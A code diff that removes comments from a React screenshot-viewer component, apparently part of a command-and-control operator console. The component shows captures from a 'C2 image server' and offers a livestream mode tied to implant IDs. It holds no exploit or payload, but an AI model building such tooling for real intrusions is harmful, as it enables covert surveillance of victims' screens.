@@ -43,18 +43,18 @@ const FullScreenExitIcon = () => (
 
 let determinedImageBaseUrl;
 
-if (typeof window !== 'undefined') { // Ensure this code runs only in the browser
-  const protocol = window.location.protocol; // "http:" or "https:"
-  const hostname = window.location.hostname; // The IP or domain name used in the browser's address bar
-  const imageServerPort = 8080; // Your C2 image server port
+if (typeof window !== 'undefined') { 
+  const protocol = window.location.protocol; 
+  const hostname = window.location.hostname; 
+  const imageServerPort = 8080; 
 
-  // If the hostname is 'localhost', you might still want to use 'localhost' for the image server
-  // or explicitly use the IP if you know you'll always access it via IP from other devices.
-  // For general use when accessing via IP from another machine, hostname will be that IP.
+  
+  
+  
   determinedImageBaseUrl = `${protocol}//${hostname}:${imageServerPort}`;
 } else {
-  // Fallback for server-side rendering or environments where window is not defined
-  // This might not be strictly necessary for CRA/Vite client-side apps but is good practice.
+  
+  
   determinedImageBaseUrl = 'http://localhost:8080';
 }
 
@@ -76,19 +76,19 @@ function ScreenshotViewer({
   const [isPlayingSlideshow, setIsPlayingSlideshow] = useState(false);
   const slideshowIntervalRef = useRef(null);
   const imageRef = useRef(null);
-  const viewerContentRef = useRef(null); // Ref for the element to make fullscreen
+  const viewerContentRef = useRef(null); 
   const [isFullScreen, setIsFullScreen] = useState(false);
 
 
-  // Effect for handling viewer open/close and initial data setup
+  
   useEffect(() => {
-    // ... (this useEffect remains largely the same)
+    
     if (isOpen) {
       setIsLoadingInitial(true);
       setErrorMessage('');
       setIsPlayingSlideshow(false);
       if (slideshowIntervalRef.current) clearInterval(slideshowIntervalRef.current);
-      setIsFullScreen(false); // Reset fullscreen state on open
+      setIsFullScreen(false); 
 
       const validPaths = (screenshotPathsFromProps || [])
         .filter(s => typeof s === 'string' && s.startsWith('c2_screenshots/'));
@@ -126,18 +126,18 @@ function ScreenshotViewer({
       if (mode === 'livestream' && implantId && onStreamStopRequested) {
         onStreamStopRequested(implantId);
       }
-      // Exit fullscreen if viewer is closed while in fullscreen
+      
       if (isFullScreen && document.fullscreenElement) {
         document.exitFullscreen().catch(err => console.error("Error exiting fullscreen on close:", err));
       }
       setIsFullScreen(false);
     }
-    // eslint-disable-next-line react-hooks/exhaustive-deps
+    
   }, [isOpen, implantId, mode, initialScreenshotPath]);
 
-  // Effect to handle updates to screenshotPathsFromProps (polling)
+  
   useEffect(() => {
-    // ... (this useEffect remains largely the same)
+    
     if (!isOpen || isLoadingInitial) return;
 
     const validPaths = (screenshotPathsFromProps || [])
@@ -178,13 +178,13 @@ function ScreenshotViewer({
         if (errorMessage) setErrorMessage('');
       }
     }
-    // eslint-disable-next-line react-hooks/exhaustive-deps
+    
   }, [screenshotPathsFromProps, isOpen, mode, isLoadingInitial]);
 
 
-  // Effect for gallery navigation changing the image
+  
   useEffect(() => {
-    // ... (this useEffect remains largely the same)
+    
     if (isOpen && mode === 'gallery' && galleryImages.length > 0 && galleryImages[currentGalleryIndex]) {
         const newSrc = `${C2_IMAGE_BASE_URL}/${galleryImages[currentGalleryIndex]}`;
         if (newSrc !== currentImageSrc) {
@@ -192,11 +192,11 @@ function ScreenshotViewer({
           setErrorMessage(''); 
         }
       }
-    // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [currentGalleryIndex, isOpen, mode]); // galleryImages change will also trigger if needed
+    
+  }, [currentGalleryIndex, isOpen, mode]); 
 
 
-  // Effect for handling fullscreen changes (e.g., user pressing ESC)
+  
   useEffect(() => {
     const handleFullScreenChange = () => {
       setIsFullScreen(!!document.fullscreenElement);
@@ -209,20 +209,20 @@ function ScreenshotViewer({
   }, []);
 
 
-  // Cleanup on unmount
+  
   useEffect(() => {
-    // ... (this useEffect remains largely the same)
+    
     return () => {
         if (slideshowIntervalRef.current) clearInterval(slideshowIntervalRef.current);
         if (isOpen && mode === 'livestream' && implantId && onStreamStopRequested) {
           onStreamStopRequested(implantId);
         }
-        // Ensure exiting fullscreen if component unmounts while in fullscreen
+        
         if (document.fullscreenElement) {
           document.exitFullscreen().catch(err => console.error("Error exiting fullscreen on unmount:", err));
         }
       };
-    // eslint-disable-next-line react-hooks/exhaustive-deps
+    
   }, [isOpen, mode, implantId]);
 
   const handleNextGallery = () => { /* ... (same) ... */ 
@@ -273,9 +273,9 @@ function ScreenshotViewer({
   if (!isOpen) return null;
 
   return (
-    <div // This is the backdrop
+    <div 
       className="fixed inset-0 bg-black bg-opacity-80 backdrop-blur-md flex flex-col items-center justify-center p-3 sm:p-4 z-[200]"
-      onClick={(e) => { if (e.target === e.currentTarget && !isFullScreen) onClose(); }} // Only close by backdrop click if not fullscreen
+      onClick={(e) => { if (e.target === e.currentTarget && !isFullScreen) onClose(); }} 
     >
       {/* This ref'd div is what will go fullscreen */}
       <div ref={viewerContentRef} className={`relative bg-gray-900 p-3 sm:p-4 rounded-lg shadow-2xl w-full flex flex-col 
@@ -294,7 +294,7 @@ function ScreenshotViewer({
             >
                 {isFullScreen ? <FullScreenExitIcon /> : <FullScreenEnterIcon />}
             </button>
-            {!isFullScreen && ( // Only show close button if not in fullscreen (ESC handles fullscreen exit)
+            {!isFullScreen && ( 
                 <button onClick={onClose} className="text-gray-400 hover:text-red-500 transition-colors p-1">
                     <CloseIcon />
                 </button>
